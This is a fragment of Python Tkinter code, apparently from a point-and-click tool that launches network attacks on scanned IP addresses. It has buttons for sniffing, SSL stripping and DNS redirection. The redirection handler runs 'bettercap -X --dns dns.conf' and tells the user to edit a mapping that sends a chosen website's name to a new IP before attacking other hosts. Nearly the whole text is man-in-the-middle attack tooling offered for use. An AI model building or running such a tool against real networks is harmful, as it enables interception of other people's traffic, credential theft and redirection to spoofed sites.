...
def Attack_Choice(list_of_widgets, Scanned_IPs):
    ...
    Button_for_Redirection = Button(my_w, text="Redirection", command=lambda: Redirection_Attack(list_of_widgets, Scanned_IPs))

    Button_for_Redirection.place(x=373, y=180)
    
    list_of_widgets.append(Button_for_Sniffing)
    list_of_widgets.append(Button_for_SSL_Striping)
    list_of_widgets.append(Button_for_Redirection)
    list_of_widgets.append(l1)
...
def Redirection_Attack(list_of_widgets, Scanned_IPs):

    Redirection_Attack_String = "bettercap -X --dns dns.conf"
    ...
    Scan_Button = Button(my_w, text="Start", command= lambda: start_function(list_of_widgets, Redirection_Attack_String))
    Scan_Button.place(x=300, y=65)    
    
    string_variable = tk.StringVar(my_w, "Modify file below to format: {NEW IP} .*{ORIGINAL WEBSITE NAME}\\.com and press 'Start' to begin attack on other IPs.")
